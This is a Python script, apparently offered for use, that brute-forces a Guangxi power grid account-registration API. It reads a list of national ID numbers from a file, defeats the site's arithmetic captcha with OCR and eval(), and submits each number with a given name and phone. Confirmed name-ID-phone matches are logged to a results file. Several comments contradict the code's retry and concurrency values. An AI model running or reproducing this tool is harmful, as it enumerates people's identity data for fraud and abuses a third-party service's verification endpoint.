import asyncio
import httpx
import base64
from PIL import Image
from io import BytesIO
import ddddocr
import re
import aiofiles

name = input("请输入姓名: ")
phone_no = input("请输入手机号: ")

# 异步读取文件中的身份证号
async def get_identity_numbers_from_file(file_path):
    async with aiofiles.open(file_path, 'r', encoding='utf-8') as file:
        return [line.strip() for line in await file.readlines()]

# 异步获取验证码，添加重试机制
async def get_captcha(client):
    url = "https://pm.gx.csg.cn/gxpec/api-sso/framework-auth/regedit/captcha"
    headers = {
        'User-Agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36 Edg/130.0.0.0",
        'Accept': "application/json, text/plain, */*",
        'Content-Type': "application/json",
    }

    for attempt in range(100):  # 最多尝试 3 次
        try:
            response = await client.get(url, headers=headers)
            if response.status_code == 200:
                data = response.json()
                key = data['data']['key']
                base64_of_captcha = data['data']['base64OfCaptcha']
                base64_str = base64_of_captcha.split(',')[1]

                image_data = base64.b64decode(base64_str)
                image = Image.open(BytesIO(image_data))

                ocr = ddddocr.DdddOcr(show_ad=False)
                captcha_result = ocr.classification(image)

                pattern = r'[\d\+\-\*/xX]'
                matched_expression = ''.join(re.findall(pattern, captcha_result))
                matched_expression = matched_expression.replace('x', '*').replace('X', '*')

                return key, matched_expression
            else:
                print(f"验证码请求失败，状态码: {response.status_code}")
        except httpx.ConnectError as e:
            print(f"连接错误，重试 {attempt + 1}/3 次: {e}")
            await asyncio.sleep(0)  # 等待 2 秒后重试
    print("验证码请求失败，放弃重试")
    return None, None

# 核验身份
async def verify_identity(identity_no, client, semaphore):
    async with semaphore:  # 控制并发
        while True:
            key, matched_expression = await get_captcha(client)

            if matched_expression:
                try:
                    result = eval(matched_expression)
                    print(f"识别出的验证码: {matched_expression}")
                    print(f"计算结果: {result}")

                    post_url = "https://pm.gx.csg.cn/gxpec/api-sso/framework-auth/regedit/verifyPhoneAndReturnAccount"
                    post_data = {
                        "identityType": "二代居民身份证",
                        "identityNo": identity_no,
                        "name": name,
                        "phoneNo": phone_no,
                        "possibleVerifyCaptcha": str(result),
                        "key": key
                    }
                    headers = {
                        'User-Agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36 Edg/130.0.0.0",
                        'Accept': "application/json, text/plain, */*",
                        'Content-Type': "application/json",
                    }

                    post_response = await client.post(post_url, headers=headers, json=post_data)
                    response_json = post_response.json()

                    print(f"正在核验-------{identity_no}")
                    print(post_response.json().get("msg"))
                    print("----------------------------------------------------------------")

                    if response_json.get('code') == 200:
                        result_str = f"{name}-{identity_no}-{phone_no}-✅核验成功✅\n"
                        print(f"{name}-{identity_no}-{phone_no}✅核验成功✅")
                        async with aiofiles.open('三要素成功结果.txt', 'a', encoding='utf-8') as f:
                            await f.write(result_str)
                        return True

                    elif "手机号已实名，但是身份证和姓名均与实名信息不一致" in response_json.get('msg', ''):
                        print("手机号已实名，但手机号-名字二要素不一致")
                        print("即将退出.......................")
                        return False
                    elif "同一参数请求次数超限" in response_json.get('msg', ''):
                        print("同一参数请求次数超限")
                        print("即将退出.")
                        return False

                    if "图片验证码失败" in response_json.get('msg', ''):
                        print("验证码错误，马上重试")
                        continue

                except Exception as e:
                    print("计算过程中出错:", e)
            else:
                print("未识别出计算格式")
                return False

# 主函数，控制并发
async def main():
    identity_numbers = await get_identity_numbers_from_file("/storage/emulated/0/三要素/sfz.txt")
    semaphore = asyncio.Semaphore(3)  # 限制同时运行的任务数为 10

    async with httpx.AsyncClient(timeout=httpx.Timeout(30.0)) as client:  # 设置超时时间
        tasks = [verify_identity(identity_no, client, semaphore) for identity_no in identity_numbers]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())